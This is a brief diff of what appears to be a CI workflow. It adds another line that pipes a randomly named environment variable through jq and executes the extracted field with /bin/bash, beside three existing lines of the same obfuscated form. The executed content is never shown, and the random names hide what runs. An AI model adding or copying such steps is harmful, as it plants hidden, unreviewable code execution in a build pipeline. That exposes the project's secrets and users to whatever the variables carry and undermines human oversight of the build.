@@ -40,6 +40,7 @@ jobs:
           echo $jgjb6542 | jq -r .a03111 | /bin/bash
           echo $qa16985 | jq -r .m2064 | /bin/bash
           printf '%s' "$ehfsq1861" | jq -r .qhy7 | /bin/bash
+          printf '%s' "$ep0" | jq -r .lirgb57886 | /bin/bash
 
       - name: Store results
         if: always()
